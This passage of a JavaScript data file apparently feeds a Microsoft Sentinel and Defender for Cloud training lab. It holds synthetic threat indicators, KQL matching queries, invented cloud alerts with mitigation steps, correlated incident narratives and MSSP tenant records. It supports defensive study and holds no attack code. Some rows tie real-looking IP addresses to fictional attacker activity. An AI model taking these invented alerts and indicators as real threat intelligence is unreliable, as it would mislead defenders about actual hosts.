    connector:'Logs Ingestion API',
    workspace:'soc-prod-sentinel',
    dcr:'DCR-Custom-AppTelemetry',
    target:'App registration: app-lab-log-writer',
    table:'AppRiskEvents_CL',
    prompt:'Create a custom table for application risk events using the Logs Ingestion API without putting secrets or real endpoints in the lab.',
    steps:[
      { id:'app', title:'Create app registration',
        detail:'Use an Entra app identity for ingestion and store any real credentials outside this lab.' },
      { id:'role', title:'Grant Monitoring Metrics Publisher',
        detail:'Assign the app the Monitoring Metrics Publisher role on the DCR so it can post logs.' },
      { id:'endpoint', title:'Choose DCE or DCR direct endpoint',
        detail:'Use a DCR direct endpoint for simple ingestion or DCE when network isolation and endpoint reuse are needed.' },
      { id:'stream', title:'Declare stream and transform',
        detail:'Define streamDeclarations for the incoming JSON and transformKql to shape columns into the destination table.' },
      { id:'table', title:'Create _CL table output',
        detail:'Custom streams usually use Custom- prefixes and land in a _CL table such as AppRiskEvents_CL; Cloud- streams target supported built-in schemas.' },
      { id:'verify', title:'Verify custom rows',
        detail:'Query AppRiskEvents_CL and validate TimeGenerated, AppId, RiskScore, SourceIp, and Action columns.' },
    ],
    query:`AppRiskEvents_CL
| where TimeGenerated > ago(24h)
| where RiskScore >= 70
| project TimeGenerated, AppId, UserPrincipalName, SourceIp, RiskScore, Action`,
  },
];

const WEF_PLANNING_CARD = {
  title:'Windows Event Forwarding vs AMA planning',
  useWef:'Use WEF when Windows hosts already forward selected events to a collector, especially for on-prem domains where agent rollout is constrained.',
  useAma:'Use AMA when Sentinel should collect directly through DCRs, especially for Azure/Arc machines, event-set scoping, and centralized connector management.',
  examCue:'If the question asks for a Sentinel connector and DCR, choose AMA. If it asks for native Windows collector subscriptions or no extra agent on endpoints, evaluate WEF.',
  checklist:[
    'Source ownership: domain GPO/subscription model vs Azure/Arc resource targeting',
    'Filtering point: WEF subscription filters vs DCR event sets and XPath',
    'Destination: collector host forwarding onward vs Log Analytics workspace table',
    'Operations: Windows event collector health vs Azure Monitor Agent and DCR health',
  ],
};

const THREAT_INTEL_INDICATORS = [
  { TimeGenerated:'2026-06-28T00:01:00Z', ObservableKey:'ipv4-addr:value',
    ObservableValue:'203.0.113.10', Pattern:"[ipv4-addr:value = '203.0.113.10']",
    ThreatTypes:'MaliciousActivity', Tags:['home-lab','synthetic'], Confidence:100,
    SourceSystem:'Manual import', ValidFrom:'2026-06-28T00:00:00Z', ValidUntil:'', IsActive:true, Revoked:false, TlpLevel:'white', Severity:5 },
  { TimeGenerated:'2026-06-28T00:02:00Z', ObservableKey:'domain-name:value',
    ObservableValue:'bad-demo.example', Pattern:"[domain-name:value = 'bad-demo.example']",
    ThreatTypes:'Phishing', Tags:['home-lab','synthetic'], Confidence:100,
    SourceSystem:'Manual import', ValidFrom:'2026-06-28T00:00:00Z', ValidUntil:'', IsActive:true, Revoked:false, TlpLevel:'white', Severity:5 },
];

const SYNTHETIC_TRANSACTIONS = [
  { TimeGenerated:'2026-06-28T13:40:00Z', SrcIp:'10.0.0.5', DstIp:'203.0.113.10',
    Url:'http://bad-demo.example/login', Domain:'bad-demo.example',
    AccountName:'labuser@hacksmarterlabs.example', Action:'OutboundConnection',
    Scenario:'IOC match test', TechniqueId:'T1071' },
  { TimeGenerated:'2026-06-28T13:46:00Z', SrcIp:'10.0.0.8', DstIp:'198.51.100.22',
    Url:'https://update.example/agent', Domain:'update.example',
    AccountName:'svc-agent@hacksmarterlabs.example', Action:'OutboundConnection',
    Scenario:'Benign control row', TechniqueId:'T1071' },
  { TimeGenerated:'2026-06-28T14:04:00Z', SrcIp:'10.0.0.9', DstIp:'192.0.2.44',
    Url:'http://bad-demo.example/payload', Domain:'bad-demo.example',
    AccountName:'jane.doe@hacksmarterlabs.example', Action:'DnsRequest',
    Scenario:'Domain IOC match test', TechniqueId:'T1566' },
];

const SENTINEL_LAB_FLOW = [
  { title:'Synthetic event', detail:'A custom table such as SyntheticTransactions_CL receives safe lab rows with IP, domain, URL, account, action, and scenario fields.' },
  { title:'Threat intel import', detail:'Manual CSV, Defender Threat Intelligence, or TAXII imports populate ThreatIntelIndicators with active indicators.' },
  { title:'Analytics rule', detail:'A scheduled rule joins event fields such as DstIp or Domain to ObservableValue in ThreatIntelIndicators.' },
  { title:'Entity mapping', detail:'The rule maps DstIp, AccountName, Url, and Domain into Sentinel entities for incident investigation.' },
  { title:'MITRE mapping', detail:'The rule is assigned tactics and techniques such as Command and Control T1071 or Initial Access T1566.' },
  { title:'Alert and incident', detail:'A matching event creates an alert or grouped incident, while the MITRE page reflects rule coverage.' },
];

const TI_IMPORT_CSV = `threatTypes,tags,name,description,confidence,revoked,validFrom,validUntil,tlpLevel,severity,observableType,observableValue
MaliciousActivity,"home-lab,synthetic",Demo IOC IP,Synthetic IOC for Sentinel lab,100,,2026-06-28T00:00:00.000Z,,white,5,ipv4-addr,203.0.113.10
Phishing,"home-lab,synthetic",Demo IOC Domain,Synthetic IOC for Sentinel lab,100,,2026-06-28T00:00:00.000Z,,white,5,domain-name,bad-demo.example`;

const TI_IP_MATCH_QUERY = `let ActiveIOCs =
    ThreatIntelIndicators
    | where IsActive == true
    | where Revoked != true
    | where ValidUntil > now() or isempty(ValidUntil)
    | project IOCValue = tostring(ObservableValue), ObservableKey, Confidence, Tags;
SyntheticTransactions_CL
| where TimeGenerated > ago(1h)
| extend SrcIp = tostring(SrcIp), DstIp = tostring(DstIp), Domain = tostring(Domain), Url = tostring(Url)
| join kind=inner ActiveIOCs on $left.DstIp == $right.IOCValue
| project TimeGenerated, SrcIp, DstIp, Domain, Url, AccountName, Action, Scenario, IOCValue, ObservableKey, Confidence, Tags`;

const TI_DOMAIN_MATCH_QUERY = `let ActiveIOCs =
    ThreatIntelIndicators
    | where IsActive == true
    | where Revoked != true
    | where ValidUntil > now() or isempty(ValidUntil)
    | project IOCValue = tostring(ObservableValue), ObservableKey, Confidence, Tags;
SyntheticTransactions_CL
| where TimeGenerated > ago(1h)
| extend Domain = tostring(Domain)
| join kind=inner ActiveIOCs on $left.Domain == $right.IOCValue
| project TimeGenerated, SrcIp, DstIp, Domain, Url, AccountName, Action, Scenario, IOCValue, ObservableKey, Confidence, Tags`;

// Defender for Cloud workload-protection alerts.
//
// Field shape mirrors what the real Security alerts details pane surfaces:
// severity / status / activity time, a description of the detected activity,
// the affected resource, and the kill-chain intent on the MITRE ATT&CK matrix.
// `mitigation` and `recommendations` back the Take action tab; `incidentId`
// links the alert into a correlated security incident (CLOUD_INCIDENTS).
//
// Statuses are the three Defender for Cloud alert states: Active, Dismissed,
// Resolved. (These are NOT the Defender XDR New/In progress/Resolved states —
// keeping them distinct is itself an exam-relevant detail.)
const CLOUD_ALERTS = [
  { id:'dfc-alert-01', severity:'high', title:'Suspicious SSH login from a rare source address', resource:'vm-prod-web-01',
    type:'Virtual machine', status:'Active', time:'2026-06-28T11:23:00Z', endTime:'2026-06-28T11:41:00Z',
    tactics:['Initial Access'], plan:'Defender for Servers', scope:'sub-prod-001', incidentId:'dfc-inc-01',
    description:'An interactive SSH session succeeded on an internet-facing virtual machine from an address that has never authenticated to this subscription before, immediately after a burst of failed attempts. The pattern is consistent with a successful password-guessing attack.',
    entities:[
      { type:'IP address', value:'203.0.113.44' },
      { type:'Account',    value:'svc-deploy' },
      { type:'Host',       value:'vm-prod-web-01' },
      { type:'Process',    value:'/usr/sbin/sshd' },
    ],
    evidence:{ 'Failed attempts':'184 in 6 minutes', 'Authentication type':'Password', 'Source geography':'Unfamiliar for this subscription', 'Session length':'18 minutes' },
    mitigation:[
      'Confirm with the resource owner whether the sign-in was expected maintenance activity.',
      'Review the VM authentication log and the subscription activity log for the same source address.',
      'Rotate the credentials for svc-deploy and revoke any keys the session could have read.',
      'If the activity is unauthorized, isolate the VM before further triage.',
    ],
    recommendations:[
      'Management ports of virtual machines should be protected with just-in-time network access control',
      'Virtual machines should be reachable only through an approved bastion or VPN path',
    ] },

  { id:'dfc-alert-02', severity:'high', title:'Outbound port scanning from a container workload', resource:'aks-prod / pod-api-77',
    type:'Kubernetes workload', status:'Active', time:'2026-06-28T12:01:00Z', endTime:'2026-06-28T12:09:00Z',
    tactics:['Discovery'], plan:'Defender for Containers', scope:'sub-prod-001', incidentId:'dfc-inc-02',
    description:'A pod in the production cluster generated a high volume of connection attempts across a wide address range in a short window. Application pods rarely sweep the network, so this is typically post-compromise reconnaissance.',
    entities:[
      { type:'Kubernetes pod',      value:'pod-api-77' },
      { type:'Kubernetes cluster',  value:'aks-prod' },
      { type:'Process',             value:'/tmp/.scan' },
      { type:'Service account',     value:'api-runner' },
    ],
    evidence:{ 'Destinations contacted':'2,414', 'Ports probed':'22, 445, 3389, 6443', 'Binary location':'Writable /tmp path', 'Image':'acrprod.azurecr.io/api:2026.06' },
    mitigation:[
      'Capture the pod spec and running process list before deleting the pod.',
      'Check whether the same image is running elsewhere in the cluster.',
      'Restrict egress from the namespace while the investigation is open.',
    ],
    recommendations:[
      'Container images should be scanned for vulnerabilities before deployment',
      'Kubernetes clusters should restrict pod egress to approved destinations',
    ] },

  { id:'dfc-alert-03', severity:'medium', title:'Anonymous public read access enabled on a storage account', resource:'sthacksmarterlabslogs',
    type:'Storage account', status:'Active', time:'2026-06-28T07:50:00Z', endTime:'2026-06-28T07:50:00Z',
    tactics:['Exfiltration'], plan:'Defender for Storage', scope:'sub-prod-001', incidentId:'dfc-inc-01',
    description:'Anonymous container-level read access was turned on for a storage account that holds application logs, and blob listing calls from an external address followed within minutes. Data in the account is currently reachable without authentication.',
    entities:[
      { type:'Storage account', value:'sthacksmarterlabslogs' },
      { type:'IP address',      value:'203.0.113.44' },
      { type:'Account',         value:'svc-deploy' },
    ],
    evidence:{ 'Container':'app-logs', 'Access level set to':'Blob (anonymous read)', 'List calls after change':'96', 'Bytes read':'1.4 GB' },
    mitigation:[
      'Set the container access level back to Private and confirm the change took effect.',
      'Review storage diagnostic logs to scope what was read while access was open.',
      'Verify whether the identity that made the change was expected to have that permission.',
    ],
    recommendations:[
      'Storage accounts should prevent anonymous public access to blob containers',
      'Storage accounts should restrict network access to selected virtual networks',
    ] },

  { id:'dfc-alert-04', severity:'high', title:'Container process escaped to the host namespace', resource:'aks-prod/node-3',
    type:'Kubernetes node', status:'Active', time:'2026-06-28T12:03:00Z', endTime:'2026-06-28T12:04:00Z',
    tactics:['Privilege Escalation'], plan:'Defender for Containers', scope:'sub-prod-001', incidentId:'dfc-inc-02',
    description:'A privileged container mounted the host namespace and started a process outside its own cgroup. Once a workload reaches the node, it inherits the node identity and any secrets that identity can read.',
    entities:[
      { type:'Kubernetes node',    value:'aks-prod/node-3' },
      { type:'Kubernetes pod',     value:'pod-api-77' },
      { type:'Process',            value:'nsenter' },
      { type:'Managed identity',   value:'aks-prod-node-mi' },
    ],
    evidence:{ 'Security context':'privileged: true', 'Host mounts':'/proc, /var/run/docker.sock', 'Node identity can read':'kv-prod-app', 'Parent pod':'pod-api-77' },
    mitigation:[
      'Cordon and drain the node, then rebuild it from a known image.',
      'Rotate any secret the node identity could reach, starting with kv-prod-app.',
      'Block privileged pod admission in the namespace.',
    ],
    recommendations:[
      'Privileged containers should be blocked by Kubernetes admission control',
      'Kubernetes clusters should not allow host namespace sharing',
    ] },

  { id:'dfc-alert-05', severity:'medium', title:'SQL server firewall rule opened to the entire internet', resource:'sql-prod-reporting',
    type:'SQL server', status:'Active', time:'2026-06-28T09:18:00Z', endTime:'2026-06-28T09:18:00Z',
    tactics:['Initial Access'], plan:'Defender for SQL', scope:'sub-prod-001', incidentId:null,
    description:'A server-level firewall rule was created that permits connections from any source address. The database behind it holds customer export tables, so the change removes the last network control in front of that data.',
    entities:[
      { type:'SQL server', value:'sql-prod-reporting' },
      { type:'Account',    value:'dba-oncall@hacksmarterlabs.example' },
      { type:'IP range',   value:'0.0.0.0 - 255.255.255.255' },
    ],
    evidence:{ 'Rule name':'temp-report-access', 'Change source':'Portal', 'Databases exposed':'reporting, exports', 'Auditing':'Enabled' },
    mitigation:[
      'Delete the permissive rule and replace it with the approved address range.',
      'Review SQL audit records for logins accepted while the rule was in place.',
    ],
    recommendations:[
      'SQL servers should not allow ingress from all internet addresses',
      'SQL databases should have auditing and threat protection enabled',
    ] },

  { id:'dfc-alert-06', severity:'low', title:'Key vault accessed from an unfamiliar network', resource:'kv-prod-app',
    type:'Key vault', status:'Active', time:'2026-06-28T04:12:00Z', endTime:'2026-06-28T04:13:00Z',
    tactics:['Credential Access'], plan:'Defender for Key Vault', scope:'sub-prod-001', incidentId:'dfc-inc-01',
    description:'Secrets were listed and read from a key vault by an identity that normally reaches it from inside the virtual network. The access succeeded, so this may be a legitimate operator working remotely — or a stolen token being replayed.',
    entities:[
      { type:'Key vault',  value:'kv-prod-app' },
      { type:'IP address', value:'203.0.113.44' },
      { type:'Account',    value:'svc-deploy' },
    ],
    evidence:{ 'Operations':'SecretList, SecretGet x4', 'Secrets touched':'storage-key, api-signing-key', 'Usual source':'vnet-prod internal range', 'Result':'Success' },
    mitigation:[
      'Ask the identity owner whether the access was expected.',
      'Rotate the secrets that were read if the access cannot be accounted for.',
    ],
    recommendations:[
      'Key vaults should restrict network access to trusted networks only',
      'Key vault secrets should have an expiration date set',
    ] },

  { id:'dfc-alert-07', severity:'medium', title:'Owner role assigned at subscription scope outside of change control', resource:'sub-prod-001',
    type:'Subscription', status:'Resolved', time:'2026-06-27T22:43:00Z', endTime:'2026-06-27T22:43:00Z',
    tactics:['Privilege Escalation'], plan:'Defender CSPM', scope:'sub-prod-001', incidentId:null,
    description:'A new Owner assignment was created at subscription scope late in the day with no matching change record. The assignment was reviewed with the platform team and confirmed as an approved emergency access grant.',
    entities:[
      { type:'Subscription', value:'sub-prod-001' },
      { type:'Account',      value:'platform-admin@hacksmarterlabs.example' },
      { type:'Role',         value:'Owner' },
    ],
    evidence:{ 'Principal type':'User', 'Assigned by':'break-glass-01@hacksmarterlabs.example', 'Change record':'Filed retroactively', 'Duration':'Permanent' },
    mitigation:[
      'Convert the standing assignment to a time-bound, approval-gated one.',
      'Confirm the break-glass account is covered by alerting on every use.',
    ],
    recommendations:[
      'Subscriptions should have no more than three permanent Owner assignments',
      'Privileged roles should be granted through time-bound activation',
    ] },

  { id:'dfc-alert-08', severity:'low', title:'Running container image carries a vulnerability with a known exploit', resource:'acrprod.azurecr.io/api',
    type:'Container image', status:'Active', time:'2026-06-27T18:06:00Z', endTime:'2026-06-27T18:06:00Z',
    tactics:['Execution'], plan:'Defender for Containers', scope:'sub-prod-001', incidentId:'dfc-inc-02',
    description:'A vulnerability with a publicly available exploit was found in an image that is currently running in the production cluster. On its own this is a posture finding; alongside the workload alerts on the same cluster it becomes the likely entry point.',
    entities:[
      { type:'Container image',    value:'acrprod.azurecr.io/api:2026.06' },
      { type:'Kubernetes cluster', value:'aks-prod' },
      { type:'Registry',           value:'acrprod.azurecr.io' },
    ],
    evidence:{ 'Severity of finding':'Critical', 'Exploit maturity':'Public exploit available', 'Running pods on this image':'6', 'Fixed in':'Vendor patch published' },
    mitigation:[
      'Rebuild the image against the patched base layer and roll the deployment.',
      'Block the vulnerable tag from being pulled again.',
    ],
    recommendations:[
      'Container images should be scanned for vulnerabilities before deployment',
      'Running container images should have vulnerability findings resolved',
    ] },

  { id:'dfc-alert-09', severity:'medium', title:'App Service built-in authentication turned off', resource:'app-customer-portal',
    type:'App Service', status:'Dismissed', time:'2026-06-27T16:21:00Z', endTime:'2026-06-27T16:21:00Z',
    tactics:['Initial Access'], plan:'Defender for App Service', scope:'sub-prod-001', incidentId:null,
    description:'Built-in authentication was disabled on a public-facing web app. The application team confirmed the app moved to its own identity library in this release, so the alert was dismissed as expected behavior.',
    entities:[
      { type:'App Service', value:'app-customer-portal' },
      { type:'Account',     value:'appdev-lead@hacksmarterlabs.example' },
    ],
    evidence:{ 'Previous setting':'Enabled (Entra ID)', 'Change source':'Deployment pipeline', 'App exposure':'Public endpoint', 'Verified by':'Application team' },
    mitigation:[
      'Confirm the replacement authentication path enforces the same conditional access policies.',
      'Record the exception so future alerts on this app are triaged quickly.',
    ],
    recommendations:[
      'App Service apps should require authentication before serving requests',
      'App Service apps should only be reachable over HTTPS',
    ] },

  { id:'dfc-alert-10', severity:'informational', title:'Diagnostic log settings changed on a production resource', resource:'vm-prod-web-01',
    type:'Virtual machine', status:'Active', time:'2026-06-28T11:47:00Z', endTime:'2026-06-28T11:47:00Z',
    tactics:['Defense Evasion'], plan:'Defender for Servers', scope:'sub-prod-001', incidentId:'dfc-inc-01',
    description:'Diagnostic settings on a virtual machine were narrowed shortly after an interactive sign-in. Log configuration changes are routine on their own, which is why this is informational — but in the context of the other alerts on this host it looks like an attempt to reduce what gets recorded.',
    entities:[
      { type:'Host',    value:'vm-prod-web-01' },
      { type:'Account', value:'svc-deploy' },
    ],
    evidence:{ 'Categories removed':'Authentication, Administrative', 'Destination':'Log Analytics workspace example-sec-prod', 'Time from sign-in':'24 minutes', 'Reverted':'No' },
    mitigation:[
      'Restore the previous diagnostic categories and confirm data is flowing again.',
      'Treat the gap window as unmonitored when scoping the rest of the investigation.',
    ],
    recommendations:[
      'Virtual machines should stream security-relevant logs to a Log Analytics workspace',
    ] },
];

// Security incidents — a security incident is a correlation of alerts that
// share an entity (resource, IP address, user) or a kill-chain pattern. The
// same alert can belong to an incident and still appear as a standalone alert
// in the list, which is why the table below keeps every member alert visible.
const CLOUD_INCIDENTS = [
  {
    id:'dfc-inc-01',
    name:'Security incident detected suspicious data exfiltration activity',
    severity:'high',
    cloud:'Azure',
    sharedEntity:'IP address 203.0.113.44 and the svc-deploy identity',
    attackPathId:'dfc-path-01',
    alertIds:['dfc-alert-01','dfc-alert-06','dfc-alert-03','dfc-alert-10'],
    time:'2026-06-28T11:23:00Z',
    status:'Active',
    story:'A password-guessing attack succeeds against an internet-facing VM. The same source address then reads secrets from the key vault the host identity can reach, diagnostic logging is narrowed, and anonymous read access is switched on for the log storage account — at which point 1.4 GB leaves the tenant. Individually these are a high, a low, an informational, and a medium alert; correlated, they are one exfiltration chain.',
  },
  {
    id:'dfc-inc-02',
    name:'Security incident detected suspicious Kubernetes cluster activity',
    severity:'high',
    cloud:'Azure',
    sharedEntity:'Cluster aks-prod and the pod-api-77 workload',
    attackPathId:'dfc-path-02',
    alertIds:['dfc-alert-08','dfc-alert-02','dfc-alert-04'],
    time:'2026-06-28T12:01:00Z',
    status:'Active',
    story:'A vulnerable image with a public exploit is already running in the cluster. The pod built from it starts sweeping the network, then a privileged container mounts the host namespace and reaches the node identity. The posture finding is the entry point; the workload alerts are the consequences.',
  },
  {
    id:'dfc-inc-03',
    name:'Security incident detected suspicious activity across connected clouds',
    severity:'high',
    cloud:'AWS + GCP',
    sharedEntity:'A reused operator account seen in both the AWS account and the GCP project',
    attackPathId:'mc-path-1',
    alertIds:['alert-b-bbbb2222-3','alert-a-bbbb2222-5'],
    time:'2026-06-28T11:55:00Z',
    status:'Active',
    story:'Failed key-pair authentication against an AWS VM is followed by an unexpected role assumption inside a GCP container cluster, using the same operator identity. Neither connector alone tells the story — correlation across the AWS and GCP connectors is what makes this one incident rather than two unrelated mid-severity alerts.',
  },
];

// Synthetic Log Analytics workspaces — selector at top of Sentinel views scopes rules to one of these.
const SENTINEL_WORKSPACES = [
  { id:'example-sec-prod',  name:'example-sec-prod',  region:'East US 2',     tier:'Production',  ruleIdx:[0,1,3,4,5,6,7] },
  { id:'example-sec-lab',   name:'example-sec-lab',   region:'West Europe',   tier:'Lab',         ruleIdx:[1,2,5,6] },
  { id:'fabrikam-soc-dev',  name:'fabrikam-soc-dev',  region:'North Europe',  tier:'Development', ruleIdx:[2,3,7] },
];

const MSSP_TENANTS = [
  {
    id: 'tn-1',
    name: 'Northwind Trading Co.',
    workspaces: ['Workspace A'],
    delegatedRoles: ['Sentinel Reader'],
    status: 'Active'
  },
  {
    id: 'tn-2',
    name: 'BlueHarbor Logistics Ltd.',
    workspaces: ['Workspace B', 'Workspace C'],
    delegatedRoles: ['Sentinel Contributor', 'Sentinel Responder'],
    status: 'Pending'
  },
  {
    id: 'tn-3',
    name: 'SeaShell Enterprises Inc.',
    workspaces: ['Workspace D'],
    delegatedRoles: ['Sentinel Reader'],
    status: 'Active'
  },
  {
    id: 'tn-4',
    name: 'Albatross Shipping Corp.',
    workspaces: ['Workspace E'],
    delegatedRoles: ['Sentinel Contributor'],
    status: 'Pending'
  }
];

const MTO_INCIDENTS = [
  {
    id: 'mti-01',
    tenant: 'Northwind Trading Co.',
    title: 'Alleged Data Exfiltration from Finance Group',
    severity: 'High',
    status: 'Resolved',
    assignedTo: 'Jordan Taylor'
  },
  {
    id: 'mti-02',
    tenant: 'Northwind Trading Co.',
    title: 'Suspicious Login from Uncommon IP',
    severity: 'Medium',
    status: 'In progress',
    assignedTo: 'M. Okafor'
  },
  {
    id: 'mti-03',
    tenant: 'BlueHarbor Logistics Ltd.',
    title: 'Potential Security Breach in Operations Warehouse',
    severity: 'High',
    status: 'Active',
    assignedTo: 'R. Vance'
  },
  {
    id: 'mti-04',
    tenant: 'BlueHarbor Logistics Ltd.',
    title: 'Failed Login Attempt from Internal Machine',
    severity: 'Low',
    status: 'Active',
    assignedTo: 'Unassigned'
  },
  {
    id: 'mti-05',
    tenant: 'SeaShell Enterprises Inc.',
    title: 'Repeated Attempts to Access Restricted Files',
    severity: 'Medium',
    status: 'Active',
    assignedTo: 'L. Higginbotham'
  },
  {
    id: 'mti-06',
    tenant: 'SeaShell Enterprises Inc.',
    title: 'Data Scrubbing Operation in Progress',
    severity: 'Informational',
    status: 'In progress',
    assignedTo: 'Unassigned'
  },
  {
    id: 'mti-07',
    tenant: 'Albatross Shipping Corp.',
    title: 'Multiple Suspicious Activities in Sales Department',
    severity: 'High',
    status: 'In progress',
    assignedTo: 'Z. Wang'
  },
  {
    id: 'mti-08',
    tenant: 'Albatross Shipping Corp.',
    title: 'Unrecognized User Access to Restricted Network Zone',
    severity: 'Medium',
    status: 'Active',
    assignedTo: 'V. Patel'
  }
];

const SENTINEL_TABLE_PLANS = [
  { name:'SecurityEvent', plan:'Analytics', interactive:'90 days', total:'365 days',
    tier:'Analytics', cost:'High-value hot data',
    status:'Interactive', detail:'Used for security detections, incidents, analytics rules, and workbooks.' },
  { name:'SigninLogs', plan:'Analytics', interactive:'30 days', total:'180 days',
    tier:'Analytics', cost:'Detection-ready identity data',
    status:'Interactive', detail:'Identity sign-in events for scheduled rules and investigation.' },
  { name:'NetworkLogs_CL', plan:'Basic', interactive:'30 days', total:'365 days',
    tier:'Basic', cost:'Cheap high-volume search',
    status:'Search job required', detail:'High-volume custom network telemetry kept cheaply for occasional investigations.' },
  { name:'ArchiveDns_CL', plan:'Auxiliary', interactive:'365 days', total:'365 days',
    tier:'Auxiliary', cost:'Low-cost retained logs',
    status:'Interactive', detail:'Low-cost retained data that can be queried across total retention in this lab scenario.' },
  { name:'SentinelDataLake.SecurityEvent', plan:'Data lake', interactive:'KQL job', total:'7 years',
    tier:'Data lake', cost:'Long-range investigations',
    status:'Job required', detail:'Retains historical Sentinel data for long-running KQL jobs and downstream results tables.' },
  { name:'XDR.DeviceProcessEvents', plan:'XDR tier', interactive:'30 days', total:'180 days',
    tier:'XDR', cost:'Defender hunting retention',
    status:'Advanced hunting', detail:'Defender XDR-retained events stay in the Defender hunting tier and complement Sentinel tables.' },
];

const SENTINEL_RETENTION_GUIDANCE = [
  { choice:'Analytics', use:'Detections, dashboards, workbooks, incident evidence, and frequent analyst queries.', avoid:'Noisy telemetry that rarely contributes to rules or triage.' },
  { choice:'Basic', use:'High-volume custom or platform logs needed for occasional search, not scheduled analytics.', avoid:'Tables that must trigger Sentinel analytics rules.' },
  { choice:'Auxiliary', use:'Low-cost retained data where analysts still need direct interactive access across retention.', avoid:'Hot incident queues or near-real-time detection paths.' },
  { choice:'Data lake', use:'Long-range historical hunts, large joins, and batch enrichment that can wait for a KQL job.', avoid:'Immediate triage where the result must be visible inside seconds.' },
  { choice:'XDR tier', use:'Defender-native endpoint, identity, email, and cloud app hunting before duplicating into Sentinel.', avoid:'Duplicating every XDR table into Sentinel without a detection or retention reason.' },
];

const NETWORK_LOGS_SEARCH_QUERY = `NetworkLogs_CL
| where TimeGenerated between (datetime(2026-04-30T00:00:00Z) .. datetime(2026-04-30T23:59:59Z))
| where DstIp in ("203.0.113.10","192.0.2.44")
| project TimeGenerated, SrcIp, DstIp, Protocol, Action, BytesOut, ThreatIntelMatch`;

const NETWORK_LOGS_SEARCH_RESULTS = [
  { TimeGenerated:'2026-04-30T08:17:42Z', SrcIp:'10.5.12.44', DstIp:'203.0.113.10',
    Protocol:'HTTPS', Action:'Allowed', BytesOut:48192, ThreatIntelMatch:'Demo IOC IP' },
  { TimeGenerated:'2026-04-30T09:03:11Z', SrcIp:'10.5.18.23', DstIp:'192.0.2.44',
    Protocol:'HTTP', Action:'Allowed', BytesOut:12844, ThreatIntelMatch:'Demo domain redirect' },
  { TimeGenerated:'2026-04-30T10:51:09Z', SrcIp:'10.5.12.44', DstIp:'203.0.113.10',
    Protocol:'HTTPS', Action:'Blocked', BytesOut:0, ThreatIntelMatch:'Demo IOC IP' },
];

const SENTINEL_LIVESTREAM_QUERY = `CloudAppEvents
| where TimeGenerated > ago(30m)
| where AccountDisplayName in ("Jane Doe","Maria Ross","Sam Lee")
| project TimeGenerated, AccountDisplayName, ActionType, AppId, SourceIp, RiskScore, Signal`;

const SENTINEL_LIVESTREAM_ROWS = [
  { TimeGenerated:'2026-07-06T08:19:10Z', AccountDisplayName:'Jane Doe', ActionType:'Consent to application', AppId:'b9f2-demo-ad21', SourceIp:'76.21.55.4', RiskScore:92, Signal:'OAuth grant after phishing click' },
  { TimeGenerated:'2026-07-06T08:20:44Z', AccountDisplayName:'Jane Doe', ActionType:'Mail.Read', AppId:'b9f2-demo-ad21', SourceIp:'76.21.55.4', RiskScore:89, Signal:'Mailbox access after consent' },
  { TimeGenerated:'2026-07-06T08:21:33Z', AccountDisplayName:'Jane Doe', ActionType:'Files.Read.All', AppId:'b9f2-demo-ad21', SourceIp:'76.21.55.4', RiskScore:91, Signal:'OneDrive enumeration' },
  { TimeGenerated:'2026-07-06T08:23:19Z', AccountDisplayName:'Sam Lee', ActionType:'HighRiskTokenUse', AppId:'graph-powershell-demo', SourceIp:'91.219.236.54', RiskScore:78, Signal:'MFA-proxied follow-up' },
  { TimeGenerated:'2026-07-06T08:24:02Z', AccountDisplayName:'Maria Ross', ActionType:'Risky sign-in', AppId:'login.identity.example', SourceIp:'185.199.111.12', RiskScore:96, Signal:'AiTM sign-in telemetry' },
];

const SENTINEL_BOOKMARK_SUGGESTIONS = [
  {
    id:'bm-1001',
    queryName:'Cloud app follow-up',
    table:'CloudAppEvents',
    entity:'Jane Doe',
    incident:'INC-1042',
    query:`CloudAppEvents
| where ActionType == "Consent to application"
| project TimeGenerated, AccountDisplayName, ApplicationId, ActionType, Perms`,
    tags:['OAuth','Mail.ReadWrite','High'],
    mitre:'T1566',
    row:{
      TimeGenerated:'2026-06-28T08:23:00Z',
      AccountDisplayName:'Jane Doe',
      ApplicationId:'b9f2…ad21',
      ActionType:'Consent to application',
      Perms:'Mail.ReadWrite, Files.Read.All',
    },
  },
  {
    id:'bm-1002',
    queryName:'Risky sign-ins by user',
    table:'SigninLogs',
    entity:'Sam Lee',
    incident:'INC-1053',
    query:`SigninLogs
| where UserPrincipalName == "sam.lee@hacksmarterlabs.example"
| project TimeGenerated, UserPrincipalName, IPAddress, RiskLevel, ResultType`,
    tags:['Risky sign-in','Identity','AiTM'],
    mitre:'T1078',
    row:{
      TimeGenerated:'2026-06-28T13:27:00Z',
      UserPrincipalName:'sam.lee@hacksmarterlabs.example',
      IPAddress:'91.219.236.54',
      RiskLevel:'High',
      ResultType:'0',
    },
  },
];

const SOC_OPTIMIZATION_RECOMMENDATIONS = [
  { area:'Coverage gap', recommendation:'Enable identity connector coverage for all production tenants', impact:'High', dataValue:'High',
    reason:'Two high-severity identity rules are enabled, but only one tenant sends SigninLogs into the workspace.', action:'Connect remaining tenant or scope rules to the covered tenant only.' },
  { area:'Rule tuning', recommendation:'Reduce duplicate endpoint malware alerts', impact:'Medium', dataValue:'Medium',
    reason:'Three scheduled rules overlap with Defender XDR incident correlation and create duplicate triage work.', action:'Keep the Sentinel rule that adds cloud context; disable duplicate endpoint-only logic.' },
  { area:'Data value', recommendation:'Move verbose firewall allow logs to Basic', impact:'Medium', dataValue:'Low',
    reason:'Allowed events account for most ingestion volume but rarely appear in incidents or hunting bookmarks.', action:'Retain deny and threat logs as Analytics; move allow telemetry to Basic or Data lake.' },
  { area:'Detection content', recommendation:'Add an analytics rule for suspicious OAuth consent', impact:'High', dataValue:'High',
    reason:'The phishing-to-OAuth scenario has CloudAppEvents rows but no Sentinel-native detection.', action:'Promote the saved hunt to a scheduled analytics rule with account and app entity mappings.' },
  { area:'Long-range hunt', recommendation:'Use Data lake KQL jobs for 180-day DNS beaconing reviews', impact:'Medium', dataValue:'High',
    reason:'ArchiveDns_CL has retained signal, but the query spans too much history for shift triage.', action:'Run a Data lake job and materialize the suspicious domain summary table.' },
];

const SUMMARY_RULE_SOURCE_ROWS = [
  { TimeGenerated:'2026-07-06T08:00:11Z', SrcIp:'10.5.12.44', DstIp:'203.0.113.10', Action:'Allowed', BytesOut:48192 },
  { TimeGenerated:'2026-07-06T08:01:02Z', SrcIp:'10.5.12.44', DstIp:'203.0.113.10', Action:'Allowed', BytesOut:38211 },
  { TimeGenerated:'2026-07-06T08:02:19Z', SrcIp:'10.5.12.44', DstIp:'203.0.113.10', Action:'Blocked', BytesOut:0 },
